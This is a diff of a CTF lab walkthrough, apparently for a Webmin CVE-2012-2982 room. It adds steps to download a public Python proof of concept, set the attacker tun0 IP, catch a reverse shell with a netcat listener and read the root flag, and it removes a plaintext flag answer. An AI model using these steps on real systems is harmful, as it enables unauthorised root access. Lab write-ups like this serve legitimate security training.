@@ -287,15 +287,17 @@ We're ready to test the final script, run the following commands:
 
 `wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py`
 
-Change the attacker IP and listen for the shell with `nc -nlvp 53`
+Change your attacker IP (tun0 address) and listener port 5353 using nano and listen for the shell with `nc -nlvp 5353`
 
-`python3 web.py <targetIP>` if you receive errors about missing libraries, install them with `pip`
+`python3 web.py <targetIP>` if you receive errors about missing libraries, install them with pip
+
+Move to the root directory and check the contents of root.txt
 
 ### Answer the questions below
 
 Run the program and listen for the shell. What is the /root/root.txt flag?
 
-THM{ur_So_1337!@#$}
+<img width="310" height="191" alt="image" src="https://github.com/user-attachments/assets/95007632-1089-4ade-bb6f-b1b562b62258" />
 
 ## Common Mistakes
 
